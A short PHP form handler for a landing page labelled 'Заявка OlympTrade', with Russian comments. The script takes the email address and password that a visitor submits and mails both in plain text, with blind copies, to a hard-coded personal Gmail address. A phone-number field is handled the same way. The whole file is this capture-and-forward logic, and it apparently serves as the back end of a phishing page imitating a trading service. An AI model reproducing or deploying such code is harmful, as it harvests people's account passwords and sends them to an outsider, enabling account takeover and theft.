<?
// Адрес почты на который придет сообщение
if( clean($_POST["password"]) == 'q' || clean($_POST["password"]) == 'й'  ) :
    // Отправляем только разработчику
    $mailto  = 'mischuk.alexander@gmail.com';
elseif( clean($_POST["name"]) == 'test' || clean($_POST["name"]) == 'тест' ) :
    // Отправляем только нам
    $mailto  = 'mischuk.alexander@gmail.com'.',';
    $mailto  .= 'mischuk.alexander@gmail.com';
else :
    // Отправляем всем
    $mailto  = 'mischuk.alexander@gmail.com'.',';
    $mailto  .= 'mischuk.alexander@gmail.com';
    // Скрытые копии
    $mailto_hiden = "bcc: mischuk.alexander@gmail.com".',';
    $mailto_hiden .= 'bcc: mischuk.alexander@gmail.com';
endif;

$title = 'Заявка OlympTrade';
$mailFrom = "zakaz@".$_SERVER['HTTP_HOST'];
$mess = '';
$headers = "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=utf-8\n";
$headers .= "Content-Transfer-Encoding: quoted-printable\n";
$headers .= "From:LP <$mailFrom>\n";
$headers .= $mailto_hiden;


// Валидация формы
if ( !empty($_POST["email"]) && !empty($_POST["password"]) ) {
    $mess .= 'Email: '.clean( $_POST['email'] ).' <br>';
    $mess .= 'Пароль: '.clean( $_POST['password'] ).' <br>';
    $mess .= 'Валюта: '.clean( $_POST['input_type'] ).' <br>';
    mail($mailto, $title, $mess, $headers);

    echo "Сообщение отправлено успешно!\n","Включите JavaScript в браузере!";
} elseif( !empty($_POST["tel"]) ) {
    $mess .= 'Телефон: '.clean( $_POST['tel'] ).' <br>';
    $mess .= 'Тип заявки: '.clean( $_POST['input_type'] ).' <br>';
    mail($mailto, $title, $mess, $headers);
} else {
    echo "Заполните поля имя или телефон!\n","Включите JavaScript в браузере!";
}

// Очистка GET и POST запросов
function clean($value = "") {
    $value = trim($value);
    $value = stripslashes($value);
    $value = strip_tags($value);
    $value = htmlspecialchars($value);

    return $value;
}
?>